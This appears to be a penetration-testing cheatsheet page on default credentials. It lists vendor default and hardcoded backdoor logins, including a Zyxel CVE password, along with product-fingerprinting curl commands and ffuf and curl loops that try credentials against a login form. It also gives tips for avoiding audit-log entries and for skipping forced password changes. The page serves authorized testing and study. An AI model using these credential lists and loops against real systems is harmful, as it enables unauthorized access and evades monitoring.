@@ -1,0 +1,161 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Default credentials · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Authentication &amp; Sessions</nav><h1>Default credentials</h1><p class="cx-lede">Vendor default logins, hardcoded backdoor accounts, and weak credential patterns that frequently survive into production.</p><div class="cx-tags"><span class="cx-tag">MITRE T1078.001, T1078.003</span><span class="cx-tag">D3FEND D3-CH</span><span class="cx-tag">IMPACT AuthBypass</span><span class="cx-tag">OWASP A07</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Vendor defaults survive into production more often than any post-pentest discussion suggests. Per Rapid7's <em>Under the Hoodie 2020</em>, ~21% of engagements gained access through default or guessable credentials. Try the obvious five before you write any wordlist.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Universal first attempts (any login form, any vendor)
+admin:admin
+admin:password
+root:root
+admin:                              # empty password
+:                                   # empty both - yes, this still works occasionally
+
+# Per-vendor lookups
+https://www.cirt.net/passwords         # CIRT.net database
+SecLists/Passwords/Default-Credentials/default-passwords.csv
+https://github.com/scadastrangelove/SCADAPASS    # ICS/SCADA
+
+# Common patterns
+&lt;vendor&gt;:&lt;vendor&gt;                   # cisco:cisco, oracle:oracle
+&lt;role&gt;:&lt;role&gt;                       # tech:tech, support:support, demo:demo
+&lt;product&gt;:                          # printer admin pages often blank-password</code></pre></figure>
+<p>Success indicator: authenticated landing page with the default credentials. Look for password-change prompts ("your password is still the default") - those confirm you used the right pair even when the response is otherwise generic.</p>
+<h2 id="where-this-lives">Where this lives</h2>
+<p>Default credentials show up most reliably in:</p>
+<ul>
+<li><strong>Network gear</strong> - switches, routers, access points, firewalls (Cisco, Juniper, Ubiquiti, MikroTik)</li>
+<li><strong>ICS / SCADA</strong> - HMIs, PLCs, historians, OPC servers (Siemens, Schneider, Advantech)</li>
+<li><strong>Storage appliances</strong> - NAS admin panels, SAN management interfaces</li>
+<li><strong>Printers and MFPs</strong> - almost always have a vendor admin password, almost never changed</li>
+<li><strong>Embedded devices</strong> - IP cameras, intercoms, building-control panels</li>
+<li><strong>Software products with default install accounts</strong> - Tomcat (<code>tomcat:s3cret</code>), Jenkins (no auth in fresh installs), GLPI (<code>glpi:glpi</code>), phpMyAdmin (depending on version)</li>
+<li><strong>Custom apps with seed data</strong> - "demo" accounts left enabled after the prototype goes to production</li>
+</ul>
+<p>The recurring pattern: anything with a maintenance interface that's "supposed to be" on a management network but ended up routable.</p>
+<h2 id="hardcoded-backdoor-accounts">Hardcoded backdoor accounts</h2>
+<p>A separate, worse category. Some vendors ship products with credentials that aren't documented and can't be changed by the customer - sometimes by design, sometimes by accident.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># CVE-2020-29583 - Zyxel USG/USG FLEX/ATP/VPN/NXC firewalls
+# Hardcoded admin account, unchangeable password
+zyfwp:PrOw!aN_fXp</code></pre></figure>
+<p>NIST tracks these under <a href="https://nvd.nist.gov/vuln/search/results?cwe_id=CWE-798">CWE-798 (Use of Hard-coded Credentials)</a> - well over 500 CVE entries as of writing. When you identify a device, check whether it has a CWE-798 entry before generating a wordlist; a hardcoded backdoor is faster than a brute-force.</p>
+<p>The 2016 SCADA StrangeLove <a href="https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv">SCADAPASS</a> list catalogs known ICS defaults including documented and undocumented entries.</p>
+<h2 id="vendor-specific-quick-lookups">Vendor-specific quick lookups</h2>
+<p>The fastest path: identify the product (banner, HTML title, favicon, error-page footer), then pull defaults from a known-good list.</p>
+<h3 id="cirtnet">CIRT.net</h3>
+<p>The longest-running default-password database - vendor pages list every known default for that vendor's products:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>https://www.cirt.net/passwords
+https://www.cirt.net/passwords?criteria=cisco          # vendor filter
+https://www.cirt.net/passwords?criteria=oracle</code></pre></figure>
+<h3 id="seclists">SecLists</h3>
+<p>Mirrored, grepable, scriptable:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># All CIRT-derived defaults
+/opt/useful/SecLists/Passwords/Default-Credentials/default-passwords.csv
+
+# Per-product wordlists
+ls /opt/useful/SecLists/Passwords/Default-Credentials/</code></pre></figure>
+<h3 id="scadapass">SCADAPASS</h3>
+<p>Industrial-control specific. Often contains entries that don't appear elsewhere:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -s https://raw.githubusercontent.com/scadastrangelove/SCADAPASS/master/scadapass.csv | grep -i &lt;vendor&gt;</code></pre></figure>
+<h2 id="identifying-the-product-first">Identifying the product first</h2>
+<p>Before trying defaults, identify what you're hitting:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Page title - fastest path
+curl -s https://&lt;TARGET&gt;/ | grep -i &#x27;&lt;title&gt;&#x27;
+
+# Page favicon - sometimes unique per product
+curl -s -o /tmp/favicon.ico https://&lt;TARGET&gt;/favicon.ico
+md5sum /tmp/favicon.ico                           # cross-reference at favicon-hash databases
+
+# HTTP response headers - server / X-Powered-By
+curl -sI https://&lt;TARGET&gt;/
+
+# Error-page footer or copyright line
+curl -s https://&lt;TARGET&gt;/nonexistent | grep -iE &#x27;(copyright|powered by|version)&#x27;
+
+# Default install paths
+/admin/login   /manager/   /admin/                # very common
+/setup/        /install/                          # leftover installers
+/wp-admin/     /administrator/                    # WordPress, Joomla</code></pre></figure>
+<p>A typical fingerprint chain: title → confirms product → CIRT.net vendor page → wordlist of 5-20 entries → manual or automated attempt.</p>
+<h2 id="cisco-worked-example">Cisco - worked example</h2>
+<p>Suppose the product banner says Cisco. CIRT.net has <a href="https://www.cirt.net/passwords?criteria=cisco">65 entries for Cisco devices</a>. Without knowing the specific model, try at minimum:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>empty:cisco                         # no username, password &quot;cisco&quot;
+cisco:cisco
+Cisco:Cisco
+cisco:router
+tech:router
+admin:admin
+admin:cisco</code></pre></figure>
+<p>If the device responds to one of these, you're done. If not, narrow by model (the device's HTML usually identifies switch / router / IOS XE / IOS XR somewhere) and retry against the model-specific defaults.</p>
+<h2 id="custom-apps-guessable-patterns">Custom apps - guessable patterns</h2>
+<p>Custom-built applications don't have a vendor default list. Try the patterns that real organizations actually use:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>admin:admin
+admin:password
+admin:&lt;companyname&gt;                 # admin:acme, admin:initech
+admin:&lt;companyname&gt;123              # admin:acme123
+admin:&lt;year&gt;                        # admin:2024
+admin:&lt;companyname&gt;&lt;year&gt;           # admin:acme2024
+
+# Role-based
+support:support
+helpdesk:helpdesk
+tech:tech
+demo:demo
+guest:guest
+test:test
+user:user
+service:service
+
+# Common &quot;I&#x27;ll change it later&quot;
+admin:changeme
+admin:welcome
+admin:Password1!
+admin:P@ssw0rd</code></pre></figure>
+<p>Run these by hand first. If none work, jump to <a href="../bruteforce-protections/index.html">Bruteforce protections</a> to see whether you can run a real wordlist without getting locked out.</p>
+<h2 id="automating-the-attempt">Automating the attempt</h2>
+<p>For known-product attacks, a small loop beats a giant wordlist:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Build a small targeted list - one credential pair per line
+cat &gt; /tmp/cisco-defaults.txt &lt;&lt; &#x27;EOF&#x27;
+cisco:cisco
+cisco:router
+admin:cisco
+tech:router
+Cisco:Cisco
+EOF
+
+# ffuf with -mode pitchfork (paired wordlists)
+ffuf -w /tmp/users.txt:UNAME -w /tmp/passes.txt:PASS \
+     -u &quot;https://&lt;TARGET&gt;/login&quot; \
+     -X POST -d &quot;user=UNAME&amp;pass=PASS&quot; \
+     -mode pitchfork \
+     -mc 302                                       # 302 = redirect to dashboard usually</code></pre></figure>
+<p>For very small lists, <code>curl</code> in a <code>while read</code> loop is faster than configuring a fuzzer:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">while IFS=: read user pass; do
+  echo -n &quot;$user:$pass → &quot;
+  curl -s -o /dev/null -w &quot;%{http_code}\n&quot; \
+    -X POST -d &quot;username=$user&amp;password=$pass&quot; \
+    https://&lt;TARGET&gt;/login
+done &lt; /tmp/cisco-defaults.txt</code></pre></figure>
+<p>The response status alone usually tells you which attempt worked - successful logins typically <code>302</code> to a dashboard while failures stay at <code>200</code> on the login page.</p>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<p>When you only want to check whether default credentials work without committing to a session:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Submit, observe response code or message, do not follow redirects
+curl -s -o /dev/null -w &quot;%{http_code}&quot; \
+  -X POST -d &quot;username=admin&amp;password=admin&quot; \
+  https://&lt;TARGET&gt;/login</code></pre></figure>
+<p>A <code>302</code> response without persisting the cookie tells you the credentials are valid without actually logging you in. Useful for stealth - you confirm the bug but don't generate a "successful login" audit-log entry for the admin user.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>First five before any wordlist.</strong> <code>admin:admin</code>, <code>admin:password</code>, <code>root:root</code>, <code>admin:</code> (blank), <code>:</code> (both blank). These survive into production at rates that would shock a developer.</li>
+<li><strong>CIRT.net and SCADAPASS overlap but aren't identical.</strong> Check both for ICS engagements - each has entries the other doesn't.</li>
+<li><strong>Hardcoded creds are CVE territory.</strong> A vendor backdoor isn't "default credentials" in the colloquial sense - it's a documented vulnerability with a CVE number, and it sometimes affects every device of that model regardless of customer configuration. Search CVE before generating a wordlist.</li>
+<li><strong>Password-must-be-changed-at-first-login.</strong> Some products enforce a password change on first login. The default still works - it just dumps you onto a "set a new password" page. That page is sometimes itself bypassable (skip the change, hit the dashboard URL directly).</li>
+<li><strong>Hardware lifecycle.</strong> Refurbished or surplus equipment often ships with its previous owner's password unchanged. Worth trying any password the previous owner is known to have used, even if the device is "new to you."</li>
+</ul>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Default credentials are sometimes legally distinct from credential brute-force in engagement scope. Some authorization letters allow "testing of vendor defaults" but not "testing of credentials." Check before throwing a 14M-line wordlist at the login. Default-cred attempts are usually the safest first move.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../index.html">Previous: Authentication &amp; Sessions</a><a class="cx-next" href="../bruteforce-protections/index.html">Next: Bruteforce protections</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
